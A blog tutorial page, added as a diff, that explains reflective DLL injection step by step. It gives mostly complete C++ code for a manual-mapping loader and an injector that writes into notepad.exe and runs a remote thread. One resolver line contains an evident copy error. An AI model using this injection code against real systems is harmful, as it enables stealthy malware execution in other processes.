@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reflective DLL Notes</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="highlight.js"></script>
+    <script src="languages.js"></script>
+    <script>
+    hljs.highlightAll();
+    </script>
+</head>
+<body>
+    <h1 style="text-align: left;">
+        <a href="index.html" style="text-decoration: none; color: grey;">KhoaLeDang's Blog</a>
+    </h1>
+    <h1 style="text-align: center;">REFLECTIVE DLL</h1>
+    <p class="mynote">Different from other injections type. This <strong>DLL</strong> will resolve itself without using <strong>LoadLibraryA</strong>. Here’s how it resolve itself:</p>
+    <p class="mynote">Readgsqword(0x60) to get the DLL base -> Search for <strong>GetProcAddress</strong>, <strong>VirtualAlloc</strong>, <strong>LoadLibraryA</strong>-&gt; <strong>VirtualAllocate</strong> the DLL get a pointer to the memory (pmem) -> Copy all the Sections and Headers to the pmem -> Rebuild <strong>IAT</strong> -> Resolve <strong>Base Relocation Table</strong> -> Call the DLL main</p>
+    <pre class="codeblock"><code class="language-cpp">
+typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
+    ..
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ...
+} LDR_DATA_TABLE_ENTRY_CUSTOM, * PLDR_DATA_TABLE_ENTRY_CUSTOM;
+    </code></pre>
+    <p class="mynote">We need to modify the struct to reveal the reserved field, It’s the <strong>BaseDllName</strong>. You can search it in Vergilius Project.</p>
+    <pre class="codeblock"><code class="language-cpp">
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, "Reflective DLL\!", "SUCCESS!", MB_OK);
+        ...
+}
+    </code></pre>
+    <p class="mynote">Here’s our simple DLL main. It will call the <strong>MessageBoxA</strong> api after it resolves itself.</p>
+    <pre class="codeblock"><code class="language-cpp">
+PVOID search_dll_base(WCHAR* dll_name) {
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    PPEB_LDR_DATA ldr = peb->Ldr;
+    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
+    LIST_ENTRY* current = head->Flink;
+    while (current != head) {
+        PLDR_DATA_TABLE_ENTRY_CUSTOM entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);
+        if (my_wcscmp(dll_name, entry->BaseDllName.Buffer) == 0)
+        {
+            return entry->DllBase;
+        }
+        current = current->Flink;
+    }
+    return NULL;
+}
+    </code></pre>
+    <p class="mynote">We’ll get <strong>PPEB</strong> from gsqword(0x60). Then using LINKED LIST with <strong>CONTAINING_RECORD</strong> to get the <strong>LDR_DATA_TABLE_ENTRY</strong>. Then use it to have the name to compare with our dll_name, then return our dll_base.</p>
+    <pre class="codeblock"><code class="language-cpp">
+FARPROC search_function(PVOID dll_base, char* fnName) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll_base + dos->e_lfanew);
+    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY exprt = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dll_base + export_rva);
+    DWORD* names = (DWORD*)((BYTE*)dll_base + exprt->AddressOfNames);
+    DWORD* funcs = (DWORD*)((BYTE*)dll_base + exprt->AddressOfFunctions);
+    WORD* ordinals = (WORD*)((BYTE*)dll_base + exprt->AddressOfNameOrdinals);
+    for (size_t i = 0; i < exprt->NumberOfNames; i++)
+    {
+        char* name = (char*)((BYTE*)dll_base + names[i]);
+        if (my_strcmp(name,fnName) == 0)
+        {
+            return (FARPROC)((BYTE*)dll_base + funcs[ordinals[i]]);
+        }
+    }
+    return NULL;
+}
+    </code></pre>
+    <p class="mynote">After having the dll_base we can search the function in the with the dll_base. Go through dos-&gt;nt-&gt;<strong>OptionalHeader</strong>.DataDirectories.<strong>VirtualAddress</strong>-&gt; + dll_base = <strong>names</strong>, <strong>ordinals</strong>, address.</p>
+    <pre class="codeblock"><code class="language-cpp">
+extern "C" __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
+    WCHAR szKernel32[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0' };
+    ...
+    PVOID kernel32_base = NULL;
+    kernel32_base = search_dll_base(szKernel32);
+    decltype(&LoadLibraryA) LoadLibraryA = (decltype(LoadLibraryA))search_function(kernel32_base, load_library_a);
+    decltype(&GetProcAddress) GetProcAddress = (decltype(GetProcAddress))search_function(kernel32_base, get_proc_address);
+    decltype(&VirtualAlloc) VirtualAlloc = (decltype(VirtualAlloc))search_function(kernel32_base, get_proc_address);
+    </code></pre>
+    <p class="mynote">After getting our <strong>VirtualAlloc</strong> function we’ll allocate the dll_base.
+    We’ll get the <strong>dll_base</strong> using <strong>lpParameter</strong> Which we can get later when the loader VirtualAlloc.</p>
+    <pre class="codeblock"><code class="language-cpp">
+        ULONG_PTR dll_base = (ULONG_PTR)lpParameter;
+    </code></pre>
+    <p class="mynote">After getting the <strong>DLL_base</strong> we can <strong>VirtualAlloc</strong> Memory of the dll_size inside our process.</p>
+    <pre class="codeblock"><code class="language-cpp">
+   PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll_base + dos->e_lfanew);
+    DWORD size_of_image = nt->OptionalHeader.SizeOfImage;
+    LPVOID mem = VirtualAlloc(NULL, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    </code></pre>
+    <p class="mynote">After <strong>Virtual Allocating</strong> we’ll copy the <strong>Headers</strong> and <strong>Sections</strong> into the new mem we just allocated. I’ll call it mem for short</p>
+    <pre class="codeblock"><code class="language-cpp">
+   DWORD size_of_headers = nt->OptionalHeader.SizeOfHeaders;
+    for (size_t i = 0; i < size_of_headers; i++)
+    {
+        ((BYTE*)mem)[i] = ((BYTE*)dll_base)[i];
+    }
+    </code></pre>
+    <p class="mynote">Go through all the headers in dll_base then put it in the new memory we just allocated.</p>
+    <pre class="codeblock"><code class="language-cpp">
+   PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+    for (size_t i = 0; i < nt->FileHeader.NumberOfSections; i++)
+    {
+        if (section[i].SizeOfRawData > 0) {
+            BYTE* dest = (BYTE*)mem + section[i].VirtualAddress;
+            BYTE* source = (BYTE*)dll_base + section[i].PointerToRawData;
+            DWORD size = section[i].SizeOfRawData;
+            for (size_t j = 0; j < size; j++)
+            {
+                dest[j] = source[j];
+            }
+        }
+    }
+    </code></pre>
+    <p class="mynote">Next is the sections. We’ll use <strong>IMAGE_FIRST_SECTION</strong> macro to get the first section. Then go through every section. Our destination is the mem and source is our dll_base.<br/>
+Rebuild <strong>Import Address Table</strong> where all the function addresses are stored. Get <strong>IMAGE_DATA_DIRECTORY</strong> from the nt->OptionalHeader.DataDirectory. IMAGE_DATA_DIRECTORY is the list of the important data inside a PE.<br/>
+Each DATA_DIRECTORY: VirtualAddress, Size;<br/>
+DataDirectory[0] - Export Directory.<br/>
+DataDirectory[1] - Import Directory: Pointer to the IMAGE_IMPORT_DESCRIPTOR<br/>
+DataDirectory[2] - Resource Directory. Icon, images, strings, version info.<br/>
+DataDirectory[5] - <strong>Base Relocation Table</strong>: Relocate the fixed address inside the code when the process is loaded into an unexpected memory location.<br/>
+DataDirectory[9] - TLS (Thread Local Storage) Directory: Contains code that get executed before main/EntryPoint.<br/>
+DataDirectory[12] - <strong>IAT</strong> (Import Address Table).</p>
+
+
+    <pre class="codeblock"><code class="language-cpp">
+   PIMAGE_DATA_DIRECTORY import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (import_dir->Size > 0)
+    {
+        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)mem + import_dir->VirtualAddress);
+        while (import_desc->Name != 0) {
+            char* dll_name = (char*)((BYTE*)mem + import_desc->Name);
+            HMODULE dll = LoadLibraryA(dll_name);
+            PIMAGE_THUNK_DATA original_thunk = (PIMAGE_THUNK_DATA)((BYTE*)mem + import_desc->OriginalFirstThunk);
+            PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)((BYTE*)mem + import_desc->FirstThunk);
+            if (import_desc->OriginalFirstThunk == 0)
+            {
+                original_thunk = first_thunk;
+            }
+            while (original_thunk->u1.AddressOfData != 0) {
+                FARPROC func_address = NULL;
+                if (IMAGE_SNAP_BY_ORDINAL(original_thunk->u1.Ordinal))
+                {
+                    LPCSTR ordinal = (LPCSTR)IMAGE_ORDINAL(original_thunk->u1.Ordinal);
+                    func_address = GetProcAddress(dll, ordinal);
+                }
+                else
+                {
+                    PIMAGE_IMPORT_BY_NAME name_data = (PIMAGE_IMPORT_BY_NAME)((BYTE*)mem + original_thunk->u1.AddressOfData);
+                    func_address = GetProcAddress(dll, name_data->Name);
+                }
+                first_thunk->u1.Function = (ULONG_PTR)func_address;
+                original_thunk++;
+                first_thunk++;
+            }
+            import_desc++;
+        }
+    }
+    </code></pre>
+    <p class="mynote">Inside we will get the <strong>IMAGE_DIRECTORY_ENTRY_IMPORT</strong>; After getting the directory we will go to the <strong>IMAGE_PORT_DESCRIPTOR</strong>. Each Descriptor represents a dll, each thunk represents a function inside that dll. Because our payload DLL is not loaded by the OS using <strong>LoadLibraryA</strong>, the Windows Loader doesn't automatically resolve the <strong>IAT</strong> for us. Therefore, we have to manually fetch and overwrite the thunks with the real function addresses. After we are done with all the functions we will <strong>import_desc++</strong> to move to the next dll. <br/>We have this formula <strong>delta</strong> = [address of the memory we got allocate] - [where we wanted the process to be loaded] We can use the <strong>delta</strong> to calculate the new absolute address for the code.</p>
+    <pre class="codeblock"><code class="language-cpp">
+    ULONG_PTR delta = (ULONG_PTR)mem - nt->OptionalHeader.ImageBase;
+    if (delta !=0)
+    {
+        PIMAGE_DATA_DIRECTORY reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        </code></pre>
+        <p class="mynote">Similar to <strong>IMAGE_IMPORT_DESCRIPTOR</strong> we use <strong>OptionalHeader</strong> to get the <strong>BASE_RELOCATION</strong>.</p>
+        <pre class="codeblock"><code class="language-cpp">
+        if (reloc_dir->Size > 0)
+        {
+            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)mem + reloc_dir->VirtualAddress);
+            while (reloc->VirtualAddress != 0) {
+                DWORD entries_count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                WORD* reloc_data = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
+                for (size_t i = 0; i < entries_count; i++) {
+                    WORD type = reloc_data[i] >> 12;
+                    WORD offset = reloc_data[i] & 0x0FFF;
+                    if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
+                        ULONG_PTR* target_address = (ULONG_PTR*)((BYTE*)mem + reloc->VirtualAddress + offset);
+                        *target_address += delta;
+                    }
+                }
+                reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
+            }
+        }
+    }
+    </code></pre>
+    <p class="mynote">entries_count: how many do we have to fix. To calculate this we’ll do a quick math. (Size of the entire block minus size of 8 bytes of the header) all divided by size of <strong>WORD</strong> (which is 2); After getting the counts, we will skip the Header then point to the data. I’ll call it <strong>reloc_data</strong>. Then we use a for loop to go through all the entries. Because we are using WORD so we’ll have  bytes = 16 bits. The first 4 bits are for the type, 12 remains are the offset. We create a pointer to the mem + reloc->VirtualAddress + offset. That's the wrong address. *target_address = *target_address + <strong>delta</strong>; This fixes the wrong address.<br/>reloc = reloc + reloc-&gt;SizeOfBlock : Next Page until the reloc-&gt;VirtualAddress == 0;<br/>The final step is to make our <strong>dll_main</strong> inside the mem .</p>
+    <pre class="codeblock"><code class="language-cpp">
+    DWORD entry_point_rva = nt->OptionalHeader.AddressOfEntryPoint;
+    if (entry_point_rva != 0)
+    {
+        ULONG_PTR entry = (ULONG_PTR)mem + entry_point_rva;
+        typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
+        DLLMAIN dll_main = (DLLMAIN)entry;
+        dll_main((HINSTANCE)mem, DLL_PROCESS_ATTACH, NULL);
+    }
+    return (ULONG_PTR)mem;
+}
+    </code></pre>
+    <p class="mynote">Then return the address of the mem.</p>
+    <p class="mynote">======================LOADER=========================</p>
+    <pre class="codeblock"><code class="language-cpp">
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#define BASE_ADDR (BYTE*)base
+DWORD RvaToOffset(PIMAGE_NT_HEADERS nt, DWORD rva) {
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (rva >= section[i].VirtualAddress && rva < section[i].VirtualAddress + section[i].Misc.VirtualSize) {
+            // Offset = RVA - VirtualAddress + PointerToRawData
+            return rva - section[i].VirtualAddress + section[i].PointerToRawData;
+        }
+    }
+    return 0;
+ }
+    </code></pre>
+    <p class="mynote">Because we are reading the file, so the <strong>RVA</strong> won’t work we have to change it to the file offset using this formula:<br/>Offset = <strong>RVA</strong> - sectionRVA + section.PointerToRawData: we minus the function <strong>RVA</strong> and the section <strong>RVA</strong> to get the depth inside from the start of the section to the function. After that we add it with the pointer to raw data to get the file offset of the file.</p>
+    <pre class="codeblock"><code class="language-cpp">
+DWORD GetReflectiveLoaderOffset(LPVOID base) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(BASE_ADDR + dos->e_lfanew);
+    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD export_offset = RvaToOffset(nt, export_rva);
+    PIMAGE_EXPORT_DIRECTORY exprt = (PIMAGE_EXPORT_DIRECTORY)(BASE_ADDR + export_offset);
+    DWORD*  names = (DWORD*)(BASE_ADDR + RvaToOffset(nt,exprt->AddressOfNames));
+    DWORD* funcs = (DWORD*)(BASE_ADDR + RvaToOffset(nt,exprt->AddressOfFunctions));
+    WORD* ordinals = (WORD*)(BASE_ADDR + RvaToOffset(nt,exprt->AddressOfNameOrdinals));
+    for (size_t i = 0; i < exprt->NumberOfNames; i++){
+	    char* Name = (char*)(BASE_ADDR + RvaToOffset(nt, names[i]));
+	    if (my_strcmp(Name, “ReflectiveLoader”) == 0 ){
+                return RvaToOffset(nt, funcs[ordinals[i]]);		
+	    }
+    }
+    return 0;
+}
+    </code></pre>
+    <p class="mynote">This is kinda similar to the search for function inside the <strong>ReflectiveDll</strong> the only difference is It’s a file offset not the <strong>RVA</strong>. Then we will return the file_offset for the <strong>CreateRemoteThread</strong> to run our <strong>ReflectiveLoader</strong>. <strong>IMPORTANT</strong> you need to declare export for the <strong>ReflectiveLoader</strong> or this won’t appear inside the <strong>IMAGE_EXPORT_DIRECTORY</strong>.<br/>The final step is our <strong>main()</strong>.<br/>I’ll create a file handle to our DLL -&gt; Read everything and put it in a local buffer -&gt; <strong>OpenProcess</strong> to our target process -&gt; <strong>VirtualAllocateEx</strong> to allocate a memory inside target. -&gt; <strong>WriteProcessMemory</strong> to write the local_buffer into the mem we just allocated -&gt; <strong>CreateRemoteThread</strong> to the function using mem+file_offset_Reflective_loader.<br/>That’s how I'm gonna do it.</p>
+    <pre class="codeblock"><code class="language-cpp">
+        int main() {
+            DWORD targetPID = FindProcessId(L"notepad.exe");
+            const char* dll_path = ("C:\\Users\\kingx\\source\\repos\\Reflective_DLL\\x64\\Release\\Reflective_DLL.dll");
+            HANDLE hFile = CreateFileA(dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE)
+            {
+                return 1;
+            }
+            DWORD fileSize = GetFileSize(hFile, NULL);
+            LPVOID localBuffer = HeapAlloc(GetProcessHeap(), 0, fileSize);
+            DWORD bytesRead;
+            ReadFile(hFile, localBuffer, fileSize, &bytesRead, NULL);
+            DWORD loaderOffset = GetReflectiveLoaderOffset(localBuffer);
+            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPID);
+            LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if ((WriteProcessMemory(hProcess, remoteMem, localBuffer, fileSize, NULL))== FALSE)
+            {
+                return 1;
+            }
+            LPTHREAD_START_ROUTINE pRemoteFunc = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteMem + loaderOffset);
+        
+            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteFunc, remoteMem, 0, NULL);
+            WaitForSingleObject(hThread, INFINITE);
+            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            CloseHandle(hThread);
+            CloseHandle(hProcess);
+        
+            return 0;
+        }
+</code></pre>
+<p class="mynote">Remember inside the  reflective dll use <strong>#pragma optimize("", off). </strong>Your Reflective DLL should work now:</p>
+<img src="IMAGES/DLL/reflective_dll.png" alt="">
+
+<p class="mynote">That's all for today see you in the next blog! <br> Source Code <a href="SourceCode/SourceReflectiveDLL.html"></a></p>
+</body>
+</html>
